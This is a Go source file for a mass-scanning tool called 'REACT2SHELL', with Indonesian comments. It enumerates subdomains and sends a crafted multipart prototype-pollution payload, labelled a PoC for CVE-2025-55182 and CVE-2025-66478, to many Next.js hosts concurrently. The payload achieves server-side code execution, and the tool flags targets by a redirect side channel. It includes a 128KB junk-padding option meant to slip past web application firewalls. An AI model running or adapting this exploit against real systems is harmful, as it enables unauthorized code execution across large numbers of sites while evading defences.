package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/projectdiscovery/subfinder/v2/pkg/runner"
)

// Pewarnaan Output
var (
	red    = color.New(color.FgRed).SprintFunc()
	green  = color.New(color.FgGreen).SprintFunc()
	yellow = color.New(color.FgYellow).SprintFunc()
	cyan   = color.New(color.FgCyan).SprintFunc()
	bold   = color.New(color.Bold).SprintFunc()
)

type Result struct {
	Host       string
	Vulnerable bool
	StatusCode int
	Error      string
}

func main() {
	// Definisi Flag / Argumen
	targetURL := flag.String("u", "", "Single URL/domain to check")
	listFile := flag.String("l", "", "File containing list of hosts")
	threads := flag.Int("t", 10, "Number of concurrent threads")
	timeoutSec := flag.Int("timeout", 10, "Request timeout in seconds")
	findSubdomains := flag.Bool("sub", false, "Find subdomains using Subfinder before scanning")
	wafBypass := flag.Bool("waf-bypass", false, "Add junk data to bypass WAF content inspection")
	flag.Parse()

	if *targetURL == "" && *listFile == "" {
		printBanner()
		flag.PrintDefaults()
		os.Exit(1)
	}

	var hosts []string

	// 1. Tahap Enumerasi Subdomain (Jika flag -sub aktif)
	if *findSubdomains && *targetURL != "" {
		fmt.Printf("%s Enumerating subdomains for %s...\n", cyan("[*]"), *targetURL)
		hosts = enumerateSubdomains(*targetURL)
		fmt.Printf("%s Found %d subdomains\n", green("[+]"), len(hosts))
	} else if *targetURL != "" {
		hosts = append(hosts, *targetURL)
	} else if *listFile != "" {
		hosts = loadHosts(*listFile)
	}

	if len(hosts) == 0 {
		fmt.Printf("%s No hosts to scan.\n", red("[!]"))
		return
	}

	// 2. Setup HTTP Client
	client := &http.Client{
		Timeout: time.Duration(*timeoutSec) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Jangan otomatis follow redirect
		},
	}

	// 3. Multithreading Scan
	resultsChan := make(chan Result, len(hosts))
	jobs := make(chan string, len(hosts))
	var wg sync.WaitGroup

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for host := range jobs {
				resultsChan <- scanHost(client, host, *wafBypass)
			}
		}()
	}

	for _, h := range hosts {
		jobs <- h
	}
	close(jobs)

	// Sinkronisasi penutupan channel hasil
	go func() {
		wg.Wait()
		close(resultsChan)
	}()

	// 4. Output Hasil
	fmt.Printf("%s Starting scan with %d threads...\n\n", cyan("[*]"), *threads)
	for res := range resultsChan {
		printResult(res)
	}
}

func printBanner() {
	banner := `
  _____              _  _  ____   _____ _          _ _ 
 |  __ \            | || ||___ \ / ____| |        | | |
 | |__) |___  __ _  | || |_ __) | (___ | |__   ___| | |
 |  _  // _ \/ _` + "`" + ` | |__   _|__ < \___ \| '_ \ / _ \ | |
 | | \ \  __/ (_| |    | | ___) |____) | | | |  __/ | |
 |_|  \_\___|\__,_|    |_||____/|_____/|_| |_|\___|_|_|
                TERMREUM REACT2SHELL v1.0
	`
	fmt.Println(cyan(banner))
}

func enumerateSubdomains(domain string) []string {
	// Bersihkan domain dari protokol
	cleanDomain := strings.TrimPrefix(domain, "http://")
	cleanDomain = strings.TrimPrefix(cleanDomain, "https://")
	cleanDomain = strings.Split(cleanDomain, "/")[0]

	subfinderOptions := &runner.Options{
		Threads:            10,
		Timeout:            30,
		MaxEnumerationTime: 10,
	}

	subfinder, err := runner.NewRunner(subfinderOptions)
	if err != nil {
		return []string{domain}
	}

	output := &bytes.Buffer{}
	// FIX: API Subfinder terbaru hanya (domain, []writers)
	_, err = subfinder.EnumerateSingleDomain(cleanDomain, []io.Writer{output})
	if err != nil {
		return []string{domain}
	}

	var subs []string
	scanner := bufio.NewScanner(output)
	for scanner.Scan() {
		sub := strings.TrimSpace(scanner.Text())
		if sub != "" {
			subs = append(subs, sub)
		}
	}

	if len(subs) == 0 {
		return []string{domain}
	}
	return subs
}

func scanHost(client *http.Client, host string, bypass bool) Result {
	if !strings.HasPrefix(host, "http") {
		host = "https://" + host
	}

	payload, ctype := buildPayload(bypass)
	req, err := http.NewRequest("POST", host, strings.NewReader(payload))
	if err != nil {
		return Result{Host: host, Vulnerable: false, Error: err.Error()}
	}

	req.Header.Set("Content-Type", ctype)
	req.Header.Set("Next-Action", "x")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Termireum/1.0")

	resp, err := client.Do(req)
	if err != nil {
		return Result{Host: host, Vulnerable: false, Error: err.Error()}
	}
	defer resp.Body.Close()

	// Deteksi berdasarkan header X-Action-Redirect (Next.js RCE Side-channel)
	redirectHeader := resp.Header.Get("X-Action-Redirect")
	isVuln := regexp.MustCompile(`.*/login\?a=11111.*`).MatchString(redirectHeader)

	return Result{Host: host, Vulnerable: isVuln, StatusCode: resp.StatusCode}
}

func buildPayload(bypass bool) (string, string) {
	boundary := "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
	var body strings.Builder

	if bypass {
		// Menambahkan junk data 128KB untuk membanjiri buffer WAF
		junk := make([]byte, 128*1024)
		rand.Seed(time.Now().UnixNano())
		for i := range junk {
			junk[i] = byte(65 + rand.Intn(25)) // Karakter A-Z
		}
		body.WriteString("--" + boundary + "\r\n")
		body.WriteString("Content-Disposition: form-data; name=\"termireum_bypass\"\r\n\r\n")
		body.WriteString(string(junk) + "\r\n")
	}

	// Payload RSC/Next.js RCE (CVE-2025-55182 & CVE-2025-66478 PoC)
	part0 := `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=41*271;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/login?a=11111;307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`

	body.WriteString("--" + boundary + "\r\n")
	body.WriteString("Content-Disposition: form-data; name=\"0\"\r\n\r\n")
	body.WriteString(part0 + "\r\n")
	body.WriteString("--" + boundary + "\r\n")
	body.WriteString("Content-Disposition: form-data; name=\"1\"\r\n\r\n")
	body.WriteString("\"$@0\"\r\n")
	body.WriteString("--" + boundary + "--\r\n")

	return body.String(), "multipart/form-data; boundary=" + boundary
}

func loadHosts(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer file.Close()
	var lines []string
	sc := bufio.NewScanner(file)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines
}

func printResult(res Result) {
	if res.Vulnerable {
		fmt.Printf("%s %-40s %s\n", red(bold("[VULN]")), res.Host, yellow("(Target is Vulnerable!)"))
	} else if res.Error != "" {
		//fmt.Printf("%s %-40s %s\n", yellow("[!]"), res.Host, res.Error)
	} else {
		fmt.Printf("%s %-40s (Status: %d)\n", green("[SAFE]"), res.Host, res.StatusCode)
	}
}
